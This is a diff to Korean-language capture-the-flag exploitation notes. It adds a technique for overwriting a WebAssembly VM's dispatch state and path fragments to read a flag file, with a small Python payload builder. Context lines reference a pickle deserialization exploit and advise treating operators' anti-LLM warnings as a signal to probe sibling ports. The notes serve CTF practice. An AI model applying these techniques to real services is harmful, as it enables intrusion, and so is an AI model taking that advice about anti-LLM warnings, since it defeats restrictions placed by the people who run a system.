@@ -233,6 +233,21 @@ payload = pickle.dumps(Exploit())
 - 특히 교육용/랩형 문제는 `/page/...` 문서에 `ssh -p ...`, `:5151`, `:5301-5303` 같은 실제 공략 포트가 그대로 남아 있는 경우가 있다.
 - 운영진이 anti-LLM 경고 문구를 의도적으로 넣은 경우, 그 문구 자체를 신호로 보고 서비스 전체를 버리지 말고 같은 도메인의 sibling port/vhost를 넓게 확인한다.
 
+### WASM VM table-dispatch 상태 덮기
+- `wasm2wat`에서 `call_indirect`가 `state + fixed_offsets`의 dword를 읽고 `xor/key` 뒤 table index로 쓰면, 보호된 wasm 메모리 안에서도 VM 상태 구조체가 곧 exploit surface다.
+- 입력을 `fread(dst, 1, N, stdin)`류로 상태에 복사하면 raw NUL 포함 payload를 보내고, opcode 슬롯과 파일 경로/권한 플래그 조각을 같은 record 안에서 동시에 덮는다.
+- table index는 elem segment 순서로 복원한다. 예: `elem[1] = f13`이면 opcode dword는 `1 ^ key`, `elem[40] = file_read`이면 `40 ^ key`.
+- WASI `--dir=.` 샌드박스는 `path_open("files/flag.txt", "r")` 같은 허용 디렉터리 내부 읽기를 막지 않으므로, VM의 path concat 조각(`prefix`, `name`, `suffix`)을 `files/`, `flag`, `.txt`로 맞춘 뒤 read primitive를 호출한다.
+
+```python
+p = bytearray(80)
+for off, idx in [(24, 25), (28, 33), (32, 40)]:  # set flags, then read
+    p[off:off+4] = p32(idx ^ 0x37)
+p[52:59] = b"files/\0"
+p[60:65] = b"flag\0"
+p[76:80] = b".txt"
+```
+
 ### libc 식별
 ```python
 # leak된 주소로 libc 버전 식별
